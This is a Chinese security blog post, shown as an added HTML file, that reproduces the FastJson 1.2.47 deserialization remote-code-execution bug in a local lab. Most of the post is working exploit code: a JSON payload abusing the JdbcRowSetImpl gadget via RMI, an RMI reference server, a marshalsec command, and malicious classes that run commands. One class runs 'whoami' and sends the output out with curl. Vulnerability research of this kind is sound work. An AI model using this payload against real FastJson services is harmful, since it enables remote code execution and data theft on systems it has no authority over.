@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>FastJson 反序列化 ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">FastJson 反序列化</h1>
+        <p class="text-center"><b>Monday, July 15th 2019, 10:16 am</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h3 id="FastJson-反序列化"><a href="#FastJson-反序列化" class="headerlink" title="FastJson 反序列化"></a>FastJson 反序列化</h3><p>前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。</p>
+<p>先下载1.2.47的FastJson，地址：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar" target="_blank" rel="noopener">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar</a></p>
+<p>利用的JDK为，java_8u60。地址：<a href="https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe" target="_blank" rel="noopener">https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe</a></p>
+<p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p>
+<p>从File - Project Structure - Modules - Dependencies导入</p>
+<p>创建poc为如下：</p>
+<pre><code>import com.alibaba.fastjson.JSON;
+
+
+public class poc {
+
+    public static void main(String[] argv) {
+        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +
+                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +
+                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;
+        JSON.parse(payload);
+    }
+
+}
+</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p>
+<p>创建一个RMI服务器。可以利用如下的JAVA代码。</p>
+<pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class rmiServer {
+
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference reference = new Reference(&quot;Exloit&quot;,
+                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;Exploit&quot;,referenceWrapper);
+    }
+}
+</code></pre><p>或者采用mar创建一个RMI服务器。</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit
+</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p>
+<pre><code>import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
+
+public class Exploit implements ObjectFactory {
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {
+        exec(&quot;xterm&quot;);
+        return null;
+    }
+
+    public static String exec(String cmd) {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return &quot;&quot;;
+    }
+
+    public static void main(String[] args) {
+        exec(&quot;123&quot;);
+    }
+}
+</code></pre><p>此处利用mar创建的RMI服务器来验证：</p>
+<p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p>
+<p>查看HTTP服务，可以看到请求的恶意class请求。</p>
+<p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p>
+<p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p>
+<p>当然如果也可以使用之前老RCE的恶意class文件</p>
+<pre><code>import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+public class exploit2 {
+    public static String exec(String cmd) throws Exception {
+        String sb = &quot;&quot;;
+        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
+        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
+        String lineStr;
+        while ((lineStr = inBr.readLine()) != null)
+            sb += lineStr + &quot;\n&quot;;
+        inBr.close();
+        in.close();
+        return sb;
+    }
+    public exploit2() throws Exception {
+        String result = &quot;&quot;;
+        result = exec(&quot;whoami&quot;);
+        String cmd=&quot;curl http://localhost:8000/&quot;+result;
+        throw new Exception(exec(cmd));
+    }
+    public static void main(String[] args) throws Exception {
+        String result = &quot;&quot;;
+        result = exec(&quot;whoami&quot;);
+        String cmd=&quot;curl http://localhost:8000/&quot;+result;
+        throw new Exception(exec(cmd));
+    }
+}
+</code></pre><p>执行后，查看携带响应的请求</p>
+<p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p>
+<p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2019/07/FastJson-反序列化/">/2019/07/FastJson-反序列化/</a>
+                    <p>发表日期：<a href="/2019/07/FastJson-反序列化/">July 15th 2019, 10:16:07 am</a>
+                    <p>更新日期：<a href="/2019/07/FastJson-反序列化/">July 15th 2019, 10:35:30 am</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;web安全</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2019/07/FastJson-反序列化/'; 
+            this.page.identifier = '/2019/07/FastJson-反序列化/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+</body>
+</html>
